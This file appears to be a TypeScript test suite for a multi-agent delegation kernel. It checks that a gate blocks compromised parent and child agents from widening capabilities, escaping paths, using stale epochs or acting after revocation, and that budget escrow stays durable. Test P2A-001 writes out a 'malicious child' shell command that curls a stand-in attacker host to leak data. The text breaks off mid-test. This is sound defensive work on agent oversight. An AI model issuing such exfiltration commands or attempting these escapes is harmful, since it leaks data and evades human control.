// FORGE Step 8 Phase 2A — Delegation Kernel Test Suite
// Verifies:
// - Delegation lifecycle state machine & terminal state immutability
// - Closed-world attenuation & EffectiveAuthorityEnvelope derivation
// - Child identity, incarnation epochs & stale epoch rejection at Gate
// - Multi-tier lineage projection, ancestor propagation & cascade revocation
// - Durable budget escrow accounting, crash consistency & non-refundability of UNCERTAIN spend
// - Cross-process advisory locking, topology bounds & canonical journal rebuild

import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  type DelegationBudget,
  type DelegationRegistryEntry,
  type DelegationId,
  type EffectiveAuthorityEnvelope,
  type ChildRequestedAuthority,
  type DelegateProposalArgs,
} from "../../src/contracts/delegation.js";
import {
  type Grant,
  type GrantId,
  type MissionId,
  type AgentId,
  type Sha256Hex,
  type Iso8601,
} from "../../src/contracts/index.js";
import {
  DelegationRegistry,
  InvalidStateTransitionError,
  TopologyLimitError,
} from "../../src/multi-agent/registry.js";
import {
  BudgetEscrowManager,
  UncertainBudgetRefundError,
} from "../../src/multi-agent/budget-escrow.js";
import { MultiAgentProjection } from "../../src/multi-agent/projection.js";
import { computeEffectiveAuthority } from "../../src/multi-agent/effective-authority.js";
import { DelegationAuthorityEvaluator } from "../../src/multi-agent/evaluator.js";
import { evaluateProposal, PathEscapeError, type PathResolver, type GateCallerContext } from "../../src/gate/gate.js";
import { Ledger } from "../../src/ledger/ledger.js";
import type { Proposal } from "../../src/contracts/proposals.js";

const body = (n: number) => ("01HZZ" + "0".repeat(21) + String(n)).slice(-26);
const makeMisId = (n: number) => `mis_${body(n)}` as MissionId;
const makeGrtId = (n: number) => `grt_${body(n)}` as GrantId;
const makeDelId = (n: number) => `del_${body(n)}` as DelegationId;
const makeAgtId = (n: number) => `agt_${body(n)}` as AgentId;

const DEFAULT_BUDGET: DelegationBudget = {
  maxPlannerTurns: 50,
  maxModelCalls: 100,
  maxTokens: 1_000_000,
  maxCapabilityCalls: 100,
  maxRetries: 10,
  maxExecutionTimeMs: 1_800_000,
  maxArtifactBytes: 50 * 1024 * 1024,
  maxConcurrentTasks: 3,
  maxSubprocesses: 2,
};

function makeGrant(overrides: Partial<Grant> = {}): Grant {
  return {
    id: makeGrtId(1),
    missionId: makeMisId(1),
    capability: "fs",
    issuer: "envelope",
    parentGrantId: null,
    constraints: { paths: ["workspace/subtasks"] },
    expiresAt: "2026-10-08T12:00:00Z" as Iso8601,
    ...overrides,
  };
}

function makeDelegateGrant(overrides: Partial<Grant> = {}): Grant {
  return {
    id: makeGrtId(2),
    missionId: makeMisId(1),
    capability: "delegate",
    issuer: "envelope",
    parentGrantId: null,
    constraints: {},
    expiresAt: "2026-10-08T12:00:00Z" as Iso8601,
    ...overrides,
  };
}

function makeEnvelope(overrides: Partial<EffectiveAuthorityEnvelope> = {}): EffectiveAuthorityEnvelope {
  return {
    capabilities: ["fs", "web_fetch"],
    constraints: {
      paths: ["workspace/subtasks"],
      hosts: ["api.example.com"],
    },
    riskCeiling: "write",
    allowHostExecution: false,
    isolationProfile: "sandboxed",
    budgetEscrow: { ...DEFAULT_BUDGET },
    depth: 1,
    maxChildren: 3,
    expiresAt: "2026-10-08T12:00:00Z" as Iso8601,
    ...overrides,
  };
}

function makeRegistryEntry(overrides: Partial<DelegationRegistryEntry> = {}): DelegationRegistryEntry {
  const dId = overrides.delegationId ?? makeDelId(1);
  return {
    delegationId: dId,
    parentDelegationId: null,
    rootMissionId: makeMisId(1),
    parentMissionId: makeMisId(1),
    childMissionId: makeMisId(2),
    parentAgentId: makeAgtId(1),
    childAgentId: makeAgtId(2),
    depth: 1,
    ancestorPath: [dId],
    childIncarnationEpoch: 1,
    containerId: null,
    hostPid: null,
    grantId: makeGrtId(1),
    grantRevision: 1,
    effectiveAuthorityHash: "a".repeat(64) as Sha256Hex,
    effectiveEnvelope: makeEnvelope(),
    status: "active",
    issuedAt: "2026-10-07T12:00:00Z" as Iso8601,
    expiresAt: "2026-10-08T12:00:00Z" as Iso8601,
    revokedAt: null,
    revocationReason: null,
    activeChildCount: 0,
    totalDescendantCount: 0,
    ...overrides,
  };
}

function makeDelegateProposalArgs(overrides: Partial<DelegateProposalArgs> = {}): DelegateProposalArgs {
  const dId = overrides.delegationId ?? makeDelId(99);
  return {
    delegationId: dId,
    parentDelegationId: null,
    parentMissionId: makeMisId(1),
    childMissionId: makeMisId(2),
    parentAgentId: makeAgtId(1),
    childAgentId: makeAgtId(2),
    incarnationEpoch: 1,
    grantId: makeGrtId(1),
    grantRevision: 1,
    requestedAuthority: {
      capabilities: ["fs"],
      constraints: { paths: ["workspace/subtasks"] },
    },
    requestedBudget: { ...DEFAULT_BUDGET, maxTokens: 10_000 },
    expiry: "2026-10-08T12:00:00Z" as Iso8601,
    topologyMetadata: {
      depth: 1,
      ancestorPath: [dId],
    },
    ...overrides,
  };
}

function evalProposal(raw: unknown, opts: any) {
  return evaluateProposal(raw, { rationale: "test", citations: [] }, opts);
}

function createTempDir(prefix: string): string {
  return mkdtempSync(join(tmpdir(), `forge-p2a-${prefix}-`));
}

// ============================================================================
// P2A-001: Malicious child envelope enforcement at Gate
// ============================================================================
test("P2A-001: Malicious child proposing tool outside effective authority envelope cannot execute", () => {
  const dId = makeDelId(1);
  const mRoot = makeMisId(1);
  const mChild = makeMisId(2);

  const projection = new MultiAgentProjection();
  projection.applyRecord({
    seq: 1,
    kind: "delegation.authorized",
    body: {
      delegationId: dId,
      parentDelegationId: null,
      parentMissionId: mRoot,
      childMissionId: mChild,
      parentAgentId: makeAgtId(1),
      childAgentId: makeAgtId(2),
      depth: 1,
      ancestorPath: [dId],
      childIncarnationEpoch: 1,
      grantId: makeGrtId(1),
      grantRevision: 1,
      effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
      effectiveEnvelope: makeEnvelope({ capabilities: ["fs"] }),
      budgetEscrow: { ...DEFAULT_BUDGET, maxTokens: 10_000 },
      newAvailableTokens: 990_000,
    },
  });
  projection.applyRecord({
    seq: 2,
    kind: "delegation.activated",
    body: {
      delegationId: dId,
      childMissionId: mChild,
      childAgentId: makeAgtId(2),
      childIncarnationEpoch: 1,
      containerId: null,
      hostPid: 1234,
    },
  });

  // Active grant possesses only fs
  const fsGrant = makeGrant({ capability: "fs", constraints: { paths: ["workspace/subtasks"] } });

  // Malicious child proposes shell command
  const maliciousProposal: Proposal = {
    capability: "shell",
    args: { argv: ["curl", "https://attacker.com/leak"], cwd: "workspace" },
  };

  const verdict = evalProposal(maliciousProposal, {
    grants: [fsGrant],
    callerContext: { agentId: makeAgtId(2), delegationId: dId, incarnationEpoch: 1 },
    multiAgentProjection: projection,
  });

  // Must never allow unauthorized capability
  assert.notEqual(verdict.type, "allow");
  assert.equal(verdict.type, "escalate");
});

// ============================================================================
// P2A-002: Directory boundary escape containment
// ============================================================================
test("P2A-002: Malicious child directory boundary escape via sibling character prefix fails containment", () => {
  const parentEnvelope = makeEnvelope({
    capabilities: ["fs"],
    constraints: { paths: ["workspace/child"] },
    riskCeiling: "write",
    isolationProfile: "sandboxed",
    allowHostExecution: false,
  });

  const childRequested: ChildRequestedAuthority = {
    capabilities: ["fs"],
    constraints: { paths: ["workspace/child-secret/key.pem"] },
    riskCeiling: "write",
    isolationProfile: "sandboxed",
  };

  const result = computeEffectiveAuthority(parentEnvelope, childRequested);
  assert.equal(result.ok, false);
  if (!result.ok) {
    assert.equal(result.dimension, "paths");
  }
});

// ============================================================================
// P2A-003: Path escape failure at Gate path resolver
// ============================================================================
test("P2A-003: Malicious child path traversal (../../parent) fails closed at Gate path resolver", () => {
  const resolver: PathResolver = {
    resolveReal(p: string) {
      if (p.includes("symlink") || p.includes("escape")) {
        throw new PathEscapeError(p);
      }
      return p;
    },
  };

  const proposal: Proposal = {
    capability: "fs",
    args: { op: "write", path: "subtasks/symlink-escape.txt", contentRef: "0".repeat(64) },
  };

  const grant = makeGrant({
    capability: "fs",
    constraints: { paths: ["subtasks/symlink-escape.txt"] },
  });

  const verdict = evalProposal(proposal, {
    grants: [grant],
    resolvePath: resolver,
  });

  assert.equal(verdict.type, "reject");
  assert.equal(verdict.reasonCode, "rejected-gate");
});

// ============================================================================
// P2A-004: Stale incarnation epoch rejection
// ============================================================================
test("P2A-004: Stale incarnation epoch proposal is mechanically rejected by Gate", () => {
  const dId = makeDelId(4);
  const mRoot = makeMisId(4);
  const mChild = makeMisId(5);
  const projection = new MultiAgentProjection();

  projection.applyRecord({
    seq: 1,
    kind: "delegation.authorized",
    body: {
      delegationId: dId,
      parentDelegationId: null,
      parentMissionId: mRoot,
      childMissionId: mChild,
      parentAgentId: makeAgtId(1),
      childAgentId: makeAgtId(2),
      depth: 1,
      ancestorPath: [dId],
      childIncarnationEpoch: 1,
      grantId: makeGrtId(1),
      grantRevision: 1,
      effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
      effectiveEnvelope: makeEnvelope(),
      budgetEscrow: { ...DEFAULT_BUDGET },
      newAvailableTokens: 900_000,
    },
  });
  projection.applyRecord({
    seq: 2,
    kind: "delegation.activated",
    body: {
      delegationId: dId,
      childMissionId: mChild,
      childAgentId: makeAgtId(2),
      childIncarnationEpoch: 1,
      containerId: null,
      hostPid: 1234,
    },
  });
  // Reincarnate to epoch 2
  projection.applyRecord({
    seq: 3,
    kind: "delegation.reincarnated",
    body: {
      delegationId: dId,
      childMissionId: mChild,
      childAgentId: makeAgtId(2),
      oldEpoch: 1,
      newEpoch: 2,
      reason: "Recovery restart",
    },
  });

  const grant = makeGrant({
    capability: "fs",
    constraints: { paths: ["workspace/subtasks/file.txt"] },
  });

  const proposal: Proposal = {
    capability: "fs",
    args: { op: "write", path: "workspace/subtasks/file.txt", contentRef: "0".repeat(64) },
  };

  // Zombie Epoch 1 calls Gate
  const verdict = evalProposal(proposal, {
    grants: [grant],
    callerContext: { agentId: makeAgtId(2), delegationId: dId, incarnationEpoch: 1 },
    multiAgentProjection: projection,
  });

  assert.equal(verdict.type, "reject");
  assert.equal(verdict.reasonCode, "stale-epoch");
});

// ============================================================================
// P2A-005: Revoked child rejection despite active grant token
// ============================================================================
test("P2A-005: Revoked child possessing active grant token is rejected by Gate", () => {
  const dId = makeDelId(5);
  const mRoot = makeMisId(5);
  const mChild = makeMisId(6);
  const projection = new MultiAgentProjection();

  projection.applyRecord({
    seq: 1,
    kind: "delegation.authorized",
    body: {
      delegationId: dId,
      parentDelegationId: null,
      parentMissionId: mRoot,
      childMissionId: mChild,
      parentAgentId: makeAgtId(1),
      childAgentId: makeAgtId(2),
      depth: 1,
      ancestorPath: [dId],
      childIncarnationEpoch: 1,
      grantId: makeGrtId(1),
      grantRevision: 1,
      effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
      effectiveEnvelope: makeEnvelope(),
      budgetEscrow: { ...DEFAULT_BUDGET },
      newAvailableTokens: 900_000,
    },
  });
  // Revoke delegation
  projection.applyRecord({
    seq: 2,
    kind: "delegation.revoked",
    body: {
      delegationId: dId,
      parentDelegationId: null,
      childMissionId: mChild,
      revokedAt: "2026-10-07T12:05:00Z" as Iso8601,
      reason: "Security policy breach",
      revokedBy: "operator",
    },
  });

  const grant = makeGrant({
    capability: "fs",
    constraints: { paths: ["workspace/subtasks/out.txt"] },
  });

  const proposal: Proposal = {
    capability: "fs",
    args: { op: "write", path: "workspace/subtasks/out.txt", contentRef: "0".repeat(64) },
  };

  const verdict = evalProposal(proposal, {
    grants: [grant],
    callerContext: { agentId: makeAgtId(2), delegationId: dId, incarnationEpoch: 1 },
    multiAgentProjection: projection,
  });

  assert.equal(verdict.type, "reject");
  assert.equal(verdict.reasonCode, "delegation-revoked");
});

// ============================================================================
// P2A-006: Compromised parent excess capability attenuation failure
// ============================================================================
test("P2A-006: Compromised parent proposing delegation with excess capabilities fails Gate evaluation", () => {
  const rootGrant = makeDelegateGrant();
  const parentEnvelope = makeEnvelope({
    capabilities: ["fs"],
    constraints: { paths: ["workspace/subtasks"] },
    riskCeiling: "write",
    isolationProfile: "sandboxed",
    allowHostExecution: false,
  });

  const delegateProposal: Proposal = {
    capability: "delegate",
    args: makeDelegateProposalArgs({
      delegationId: makeDelId(60),
      requestedAuthority: {
        capabilities: ["fs", "shell"],
        constraints: { paths: ["workspace/subtasks"] },
      },
    }),
  };

  const verdict = evalProposal(delegateProposal, {
    grants: [rootGrant],
    parentEnvelope,
    multiAgentProjection: new MultiAgentProjection(),
    now: new Date("2026-10-07T12:00:00Z"),
  });

  assert.equal(verdict.type, "reject");
  assert.equal(verdict.reasonCode, "attenuation-failed-capabilities");
});

// ============================================================================
// P2A-007: Compromised parent lifetime expansion failure
// ============================================================================
test("P2A-007: Compromised parent proposing delegation with longer expiry is rejected", () => {
  const rootGrant = makeDelegateGrant({
    expiresAt: "2026-10-07T13:00:00Z" as Iso8601,
  });

  const parentEnvelope = makeEnvelope({
    capabilities: ["fs"],
    constraints: { paths: ["workspace/subtasks"] },
    riskCeiling: "write",
    isolationProfile: "sandboxed",
    allowHostExecution: false,
    expiresAt: "2026-10-07T13:00:00Z" as Iso8601,
  });

  const delegateProposal: Proposal = {
    capability: "delegate",
    args: makeDelegateProposalArgs({
      delegationId: makeDelId(70),
      requestedAuthority: { capabilities: ["fs"], constraints: { paths: ["workspace/subtasks"] } },
      expiry: "2026-10-07T15:00:00Z" as Iso8601, // Exceeds parent expiry
    }),
  };

  const verdict = evalProposal(delegateProposal, {
    grants: [rootGrant],
    parentEnvelope,
    multiAgentProjection: new MultiAgentProjection(),
    now: new Date("2026-10-07T12:00:00Z"),
  });

  assert.equal(verdict.type, "reject");
  assert.equal(verdict.reasonCode, "attenuation-failed-processLifetime");
});

// ============================================================================
// P2A-008: Grandchild capability widening failure
// ============================================================================
test("P2A-008: Grandchild delegation (A -> B -> C) cannot widen capabilities beyond Child B", () => {
  const childBEnvelope = makeEnvelope({
    capabilities: ["fs"],
    constraints: { paths: ["workspace/subtasks"] },
    riskCeiling: "read", // Read-only
    isolationProfile: "sandboxed",
    allowHostExecution: false,
  });

  // Grandchild C requests write risk
  const grandchildCRequest: ChildRequestedAuthority = {
    capabilities: ["fs"],
    constraints: { paths: ["workspace/subtasks"] },
    riskCeiling: "write",
    isolationProfile: "sandboxed",
  };

  const result = computeEffectiveAuthority(childBEnvelope, grandchildCRequest);
  assert.equal(result.ok, false);
  if (!result.ok) {
    assert.equal(result.dimension, "risk");
  }
});

// ============================================================================
// P2A-009: Depth bound limit D <= 3 enforcement
// ============================================================================
test("P2A-009: Grandchild delegation at depth 3 cannot delegate to depth 4 (depth limit D <= 3)", () => {
  const dA = makeDelId(91);
  const dB = makeDelId(92);
  const dC = makeDelId(93);

  const projection = new MultiAgentProjection();
  // Authorize A (depth 1)
  projection.applyRecord({
    seq: 1,
    kind: "delegation.authorized",
    body: {
      delegationId: dA,
      parentDelegationId: null,
      parentMissionId: makeMisId(1),
      childMissionId: makeMisId(2),
      parentAgentId: makeAgtId(1),
      childAgentId: makeAgtId(2),
      depth: 1,
      ancestorPath: [dA],
      childIncarnationEpoch: 1,
      grantId: makeGrtId(1),
      grantRevision: 1,
      effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
      effectiveEnvelope: makeEnvelope({ depth: 1 }),
      budgetEscrow: { ...DEFAULT_BUDGET, maxTokens: 5000 },
      newAvailableTokens: 995_000,
    },
  });
  // Authorize B (depth 2)
  projection.applyRecord({
    seq: 2,
    kind: "delegation.authorized",
    body: {
      delegationId: dB,
      parentDelegationId: dA,
      parentMissionId: makeMisId(2),
      childMissionId: makeMisId(3),
      parentAgentId: makeAgtId(2),
      childAgentId: makeAgtId(3),
      depth: 2,
      ancestorPath: [dA, dB],
      childIncarnationEpoch: 1,
      grantId: makeGrtId(2),
      grantRevision: 1,
      effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
      effectiveEnvelope: makeEnvelope({ depth: 2 }),
      budgetEscrow: { ...DEFAULT_BUDGET, maxTokens: 2000 },
      newAvailableTokens: 993_000,
    },
  });
  // Authorize C (depth 3)
  projection.applyRecord({
    seq: 3,
    kind: "delegation.authorized",
    body: {
      delegationId: dC,
      parentDelegationId: dB,
      parentMissionId: makeMisId(3),
      childMissionId: makeMisId(4),
      parentAgentId: makeAgtId(3),
      childAgentId: makeAgtId(4),
      depth: 3,
      ancestorPath: [dA, dB, dC],
      childIncarnationEpoch: 1,
      grantId: makeGrtId(3),
      grantRevision: 1,
      effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
      effectiveEnvelope: makeEnvelope({ depth: 3 }),
      budgetEscrow: { ...DEFAULT_BUDGET, maxTokens: 1000 },
      newAvailableTokens: 992_000,
    },
  });

  // C proposes delegation for D (depth 4)
  const evalResult = DelegationAuthorityEvaluator.evaluate(
    makeDelegateProposalArgs({
      delegationId: makeDelId(94),
      parentDelegationId: dC,
      topologyMetadata: {
        depth: 4 as any,
        ancestorPath: [dA, dB, dC, makeDelId(94)],
      },
    }),
    makeDelegateGrant(),
    undefined,
    projection,
  );

  assert.equal(evalResult.ok, false);
  assert(
    evalResult.reasonCode === "depth-limit-exceeded" ||
    evalResult.reasonCode === "rejected-schema" ||
    evalResult.reasonCode === "depth-hierarchy-mismatch"
  );
});

// ============================================================================
// P2A-010: Immediate cascade revocation of descendant lineage
// ============================================================================
test("P2A-010: Revoking ancestor A immediately blocks proposals from Grandchild C, even for read-only", () => {
  const dA = makeDelId(101);
  const dB = makeDelId(102);
  const dC = makeDelId(103);

  const projection = new MultiAgentProjection();
  projection.applyRecord({
    seq: 1,
    kind: "delegation.authorized",
    body: {
      delegationId: dA,
      parentDelegationId: null,
      parentMissionId: makeMisId(1),
      childMissionId: makeMisId(2),
      parentAgentId: makeAgtId(1),
      childAgentId: makeAgtId(2),
      depth: 1,
      ancestorPath: [dA],
      childIncarnationEpoch: 1,
      grantId: makeGrtId(1),
      grantRevision: 1,
      effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
      effectiveEnvelope: makeEnvelope({ depth: 1 }),
      budgetEscrow: { ...DEFAULT_BUDGET, maxTokens: 5000 },
      newAvailableTokens: 995_000,
    },
  });
  projection.applyRecord({
    seq: 2,
    kind: "delegation.authorized",
    body: {
      delegationId: dB,
      parentDelegationId: dA,
      parentMissionId: makeMisId(2),
      childMissionId: makeMisId(3),
      parentAgentId: makeAgtId(2),
      childAgentId: makeAgtId(3),
      depth: 2,
      ancestorPath: [dA, dB],
      childIncarnationEpoch: 1,
      grantId: makeGrtId(2),
      grantRevision: 1,
      effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
      effectiveEnvelope: makeEnvelope({ depth: 2 }),
      budgetEscrow: { ...DEFAULT_BUDGET, maxTokens: 2000 },
      newAvailableTokens: 993_000,
    },
  });
  projection.applyRecord({
    seq: 3,
    kind: "delegation.authorized",
    body: {
      delegationId: dC,
      parentDelegationId: dB,
      parentMissionId: makeMisId(3),
      childMissionId: makeMisId(4),
      parentAgentId: makeAgtId(3),
      childAgentId: makeAgtId(4),
      depth: 3,
      ancestorPath: [dA, dB, dC],
      childIncarnationEpoch: 1,
      grantId: makeGrtId(3),
      grantRevision: 1,
      effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
      effectiveEnvelope: makeEnvelope({ depth: 3, riskCeiling: "read" }),
      budgetEscrow: { ...DEFAULT_BUDGET, maxTokens: 1000 },
      newAvailableTokens: 992_000,
    },
  });

  // Revoke root ancestor A
  projection.applyRecord({
    seq: 4,
    kind: "delegation.revoked",
    body: {
      delegationId: dA,
      parentDelegationId: null,
      childMissionId: makeMisId(2),
      revokedAt: "2026-10-07T12:05:00Z" as Iso8601,
      revokedBy: "operator",
      reason: "Emergency stop",
    },
  });

  const readGrant = makeGrant({
    capability: "fs",
    constraints: { paths: ["workspace/subtasks/audit.log"] },
  });

  const proposal: Proposal = {
    capability: "fs",
    args: { op: "write", path: "workspace/subtasks/audit.log", contentRef: "0".repeat(64) },
  };

  const verdict = evalProposal(proposal, {
    grants: [readGrant],
    callerContext: { agentId: makeAgtId(4), delegationId: dC, incarnationEpoch: 1 },
    multiAgentProjection: projection,
  });

  assert.equal(verdict.type, "reject");
  assert.equal(verdict.reasonCode, "delegation-revoked");
});

// ============================================================================
// P2A-011: Terminal ancestor invalidates descendant lineage
// ============================================================================
test("P2A-011: Inactive ancestor (failed/cancelled/expired) immediately invalidates descendant lineage", () => {
  const dA = makeDelId(111);
  const dB = makeDelId(112);

  const projection = new MultiAgentProjection();
  projection.applyRecord({
    seq: 1,
    kind: "delegation.authorized",
    body: {
      delegationId: dA,
      parentDelegationId: null,
      parentMissionId: makeMisId(1),
      childMissionId: makeMisId(2),
      parentAgentId: makeAgtId(1),
      childAgentId: makeAgtId(2),
      depth: 1,
      ancestorPath: [dA],
      childIncarnationEpoch: 1,
      grantId: makeGrtId(1),
      grantRevision: 1,
      effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
      effectiveEnvelope: makeEnvelope({ depth: 1 }),
      budgetEscrow: { ...DEFAULT_BUDGET, maxTokens: 5000 },
      newAvailableTokens: 995_000,
    },
  });
  projection.applyRecord({
    seq: 2,
    kind: "delegation.authorized",
    body: {
      delegationId: dB,
      parentDelegationId: dA,
      parentMissionId: makeMisId(2),
      childMissionId: makeMisId(3),
      parentAgentId: makeAgtId(2),
      childAgentId: makeAgtId(3),
      depth: 2,
      ancestorPath: [dA, dB],
      childIncarnationEpoch: 1,
      grantId: makeGrtId(2),
      grantRevision: 1,
      effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
      effectiveEnvelope: makeEnvelope({ depth: 2 }),
      budgetEscrow: { ...DEFAULT_BUDGET, maxTokens: 2000 },
      newAvailableTokens: 993_000,
    },
  });

  // Cancel ancestor A
  projection.applyRecord({
    seq: 3,
    kind: "delegation.cancelled",
    body: { delegationId: dA, reason: "Task abandoned" },
  });

  const lineage = projection.isLineageActive(dB);
  assert.equal(lineage.ok, false);
  if (!lineage.ok) {
    assert.equal(lineage.revokedAtId, dA);
  }
});

// ============================================================================
// P2A-012: Reopening terminal delegation state throws
// ============================================================================
test("P2A-012: Reopening terminal delegation state throws InvalidStateTransitionError", () => {
  const tmp = createTempDir("lifecycle-terminal");
  try {
    const storagePath = join(tmp, "delegation-registry.json");
    const registry = new DelegationRegistry(storagePath);
    const dId = makeDelId(120);

    const entry = makeRegistryEntry({
      delegationId: dId,
      status: "authorized",
    });

    registry.registerDelegation(entry);
    registry.updateStatus(dId, "active");
    registry.updateStatus(dId, "completed"); // Terminal state!

    // Attempting to reopen completed delegation to active MUST throw
    assert.throws(() => {
      registry.updateStatus(dId, "active");
    }, InvalidStateTransitionError);

    // Attempting to transition completed delegation to failed MUST throw
    assert.throws(() => {
      registry.updateStatus(dId, "failed");
    }, InvalidStateTransitionError);
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

// ============================================================================
// P2A-013: Reincarnating revoked state throws error
// ============================================================================
test("P2A-013: Reopening terminal state via reincarnate throws DelegationRegistryError", () => {
  const tmp = createTempDir("reincarnate-terminal");
  try {
    const storagePath = join(tmp, "delegation-registry.json");
    const registry = new DelegationRegistry(storagePath);
    const dId = makeDelId(130);

    const entry = makeRegistryEntry({
      delegationId: dId,
      status: "authorized",
    });

    registry.registerDelegation(entry);
    registry.revokeDelegation(dId, "Revoked for test");

    // Attempt to reincarnate a revoked delegation MUST throw
    assert.throws(() => {
      registry.reincarnate(dId, 2);
    });
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

// ============================================================================
// P2A-014: Fanout bound F <= 3 under file lock
// ============================================================================
test("P2A-014: Concurrent child delegations enforce fanout bound (F <= 3) under file lock", () => {
  const tmp = createTempDir("concurrent-fanout");
  try {
    const storagePath = join(tmp, "delegation-registry.json");
    const registry = new DelegationRegistry(storagePath);
    const pId = makeDelId(140);

    // Register parent
    registry.registerDelegation(
      makeRegistryEntry({
        delegationId: pId,
        parentDelegationId: null,
        depth: 1,
        ancestorPath: [pId],
        status: "active",
      }),
    );

    // Register 3 children (reaches MAX_CHILD_FANOUT = 3)
    for (let i = 1; i <= 3; i++) {
      const cId = makeDelId(140 + i);
      registry.registerDelegation(
        makeRegistryEntry({
          delegationId: cId,
          parentDelegationId: pId,
          childMissionId: makeMisId(140 + i),
          childAgentId: makeAgtId(140 + i),
          depth: 2,
          ancestorPath: [pId, cId],
          status: "active",
        }),
      );
    }

    // 4th child attempt MUST fail with TopologyLimitError
    const cId4 = makeDelId(144);
    assert.throws(() => {
      registry.registerDelegation(
        makeRegistryEntry({
          delegationId: cId4,
          parentDelegationId: pId,
          childMissionId: makeMisId(144),
          childAgentId: makeAgtId(144),
          depth: 2,
          ancestorPath: [pId, cId4],
          status: "active",
        }),
      );
    }, TopologyLimitError);
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

// ============================================================================
// P2A-015: Budget CAS reservation prevents double spend
// ============================================================================
test("P2A-015: Budget CAS reservation prevents over-allocation and double spend", () => {
  const manager = new BudgetEscrowManager({
    ...DEFAULT_BUDGET,
    maxTokens: 10_000,
  });

  const d1 = makeDelId(151);
  const d2 = makeDelId(152);

  // Reserve 8,000 tokens
  const res1 = manager.atomicReserveEscrow(d1, {
    ...DEFAULT_BUDGET,
    maxTokens: 8_000,
    maxModelCalls: 5,
    maxCapabilityCalls: 10,
    maxExecutionTimeMs: 50_000,
    maxArtifactBytes: 500_000,
  });

  assert.equal(res1.ok, true);
  assert.equal(manager.getAvailableBudget().maxTokens, 2_000);

  // Attempt to reserve another 8,000 tokens must fail CAS check
  const res2 = manager.atomicReserveEscrow(d2, {
    ...DEFAULT_BUDGET,
    maxTokens: 8_000,
    maxModelCalls: 5,
    maxCapabilityCalls: 10,
    maxExecutionTimeMs: 50_000,
    maxArtifactBytes: 500_000,
  });

  assert.equal(res2.ok, false);
  assert.equal(res2.reason, "InsufficientAvailableBudget");
  assert.equal(res2.errorDimension, "maxTokens");

  // Available remains intact
  assert.equal(manager.getAvailableBudget().maxTokens, 2_000);
});

// ============================================================================
// P2A-016: Committed budget survives restart, ephemeral reservation disappears
// ============================================================================
test("P2A-016: Committed budget survives restart, uncommitted reservation disappears", () => {
  const tmp = createTempDir("budget-durability");
  const mId = makeMisId(160);
  const ledger = new Ledger({ dataDir: tmp, missionId: mId, writer: { pid: process.pid, host: "test" } });
  try {
    const dIdCommitted = makeDelId(161);

    // Commit authorized delegation to journal
    ledger.append({
      kind: "delegation.authorized",
      author: "runtime",
      ts: "2026-10-07T12:00:00Z" as Iso8601,
      body: {
        delegationId: dIdCommitted,
        parentDelegationId: null,
        parentMissionId: mId,
        childMissionId: makeMisId(161),
        parentAgentId: makeAgtId(1),
        childAgentId: makeAgtId(2),
        depth: 1,
        ancestorPath: [dIdCommitted],
        grantId: makeGrtId(1),
        grantRevision: 1,
        effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
        effectiveEnvelope: makeEnvelope(),
        budgetEscrow: {
          ...DEFAULT_BUDGET,
          maxTokens: 4000,
          maxModelCalls: 5,
          maxCapabilityCalls: 5,
          maxExecutionTimeMs: 60_000,
          maxArtifactBytes: 1024 * 1024,
          maxConcurrentTasks: 1,
          maxSubprocesses: 1,
        },
        newAvailableTokens: DEFAULT_BUDGET.maxTokens - 4000,
      },
    });

    // Uncommitted in-memory manager
    const manager = BudgetEscrowManager.rebuildFromLedger(ledger, DEFAULT_BUDGET);
    assert.equal(manager.getAvailableBudget().maxTokens, DEFAULT_BUDGET.maxTokens - 4000);

    // Make ephemeral reservation in memory without ledger append
    const dIdUncommitted = makeDelId(162);
    const res = manager.atomicReserveEscrow(dIdUncommitted, {
      ...DEFAULT_BUDGET,
      maxTokens: 10_000,
      maxModelCalls: 5,
      maxCapabilityCalls: 5,
      maxExecutionTimeMs: 60_000,
      maxArtifactBytes: 1024 * 1024,
      maxConcurrentTasks: 1,
      maxSubprocesses: 1,
    });
    assert.equal(res.ok, true);
    assert.equal(manager.getAvailableBudget().maxTokens, DEFAULT_BUDGET.maxTokens - 14_000);

    // Simulate crash and cold reboot by rebuilding from ledger
    const rebooted = BudgetEscrowManager.rebuildFromLedger(ledger, DEFAULT_BUDGET);
    // Uncommitted reservation disappeared; committed reservation remains deducted!
    assert.equal(rebooted.getAvailableBudget().maxTokens, DEFAULT_BUDGET.maxTokens - 4000);
    assert.equal(rebooted.getEscrow(dIdUncommitted), undefined);
    assert.notEqual(rebooted.getEscrow(dIdCommitted), undefined);
  } finally {
    ledger.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});

// ============================================================================
// P2A-017: UNCERTAIN budget spend persists across restart
// ============================================================================
test("P2A-017: UNCERTAIN budget spend persists across restart and blocks direct refund", () => {
  const tmp = createTempDir("budget-uncertain");
  const mId = makeMisId(170);
  const ledger = new Ledger({ dataDir: tmp, missionId: mId, writer: { pid: process.pid, host: "test" } });
  try {
    const dId = makeDelId(171);

    ledger.append({
      kind: "delegation.authorized",
      author: "runtime",
      ts: "2026-10-07T12:00:00Z" as Iso8601,
      body: {
        delegationId: dId,
        parentDelegationId: null,
        parentMissionId: mId,
        childMissionId: makeMisId(171),
        parentAgentId: makeAgtId(1),
        childAgentId: makeAgtId(2),
        depth: 1,
        ancestorPath: [dId],
        grantId: makeGrtId(1),
        grantRevision: 1,
        effectiveAuthorityHash: "0".repeat(64) as Sha256Hex,
        effectiveEnvelope: makeEnvelope(),
        budgetEscrow: { ...DEFAULT_BUDGET, maxTokens: 5000 },
        newAvailableTokens: DEFAULT_BUDGET.maxTokens - 5000,
      },
    });

    // Activated then abruptly revoked
    ledger.append({
      kind: "delegation.activated",
      author: "runtime",
      ts: "2026-10-07T12:01:00Z" as Iso8601,
      body: {
